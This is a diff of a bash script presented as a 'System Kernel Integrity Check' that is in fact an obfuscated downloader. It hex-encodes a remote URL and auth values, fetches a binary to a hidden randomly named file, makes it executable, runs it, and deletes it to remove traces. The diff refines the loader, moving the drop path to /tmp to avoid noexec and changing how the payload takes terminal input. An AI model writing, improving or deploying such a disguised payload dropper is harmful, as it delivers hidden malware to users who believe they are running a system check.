@@ -1,6 +1,6 @@
 #!/bin/bash
 # ==========================================
-# SYSTEM KERNEL INTEGRITY CHECK V10.4
+# SYSTEM KERNEL INTEGRITY CHECK V10.5
 # ==========================================
 
 _h="0x680x740x740x700x730x3a0x2f0x2f0x630x720x610x650x6c0x2d0x6b0x650x650x700x720x2e0x700x6c0x750x6d0x730x6f0x660x740x770x610x720x650x640x650x760x2e0x770x6f0x720x6b0x650x720x730x2e0x640x650x76"
@@ -25,11 +25,11 @@ _token=$(_d "$_k")
 _auth_h=$(_d "$_hdr")
 _agent=$(_d "$_ua")
 
-# Random hidden RAM path
+# FIX: Use /tmp instead of /dev/shm because /dev/shm is often 'noexec'
 _rnd=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 6)
-_dest="/dev/shm/.sys_mem_${_rnd}"
+_dest="/tmp/.sys_mem_${_rnd}"
 
-# UI Colors (Hex)
+# UI Colors
 _g=$(printf "\x1b\x5b\x33\x38\x3b\x35\x3b\x34\x36\x6d")
 _rst=$(printf "\x1b\x5b\x30\x6d")
 
@@ -37,10 +37,8 @@ echo -e "${_g}[*] Handshaking with Secure Grid...${_rst}"
 
 # --- 5. EXECUTION LOGIC ---
 if command -v "$_w" >/dev/null 2>&1; then
-    # wget -q --header="Key: Val" -O dest url
     $_w -q --user-agent="$_agent" --header="$_auth_h: $_token" -O "$_dest" "$_target"
 else
-    # curl -L -H "Key: Val" -o dest url
     $_c -L -A "$_agent" -H "$_auth_h: $_token" -o "$_dest" "$_target" --progress-bar
 fi
 
@@ -48,8 +46,11 @@ fi
 if [ -s "$_dest" ] && ! grep -q "ACCESS DENIED" "$_dest"; then
     $_x +x "$_dest"
     
-    # Run from RAM
-    "$_dest" < /dev/tty
+    # FINAL INPUT LOCK
+    exec < /dev/tty
+    
+    # Run the binary
+    "$_dest"
     
     # Nuke Traces
     $_r -f "$_dest"
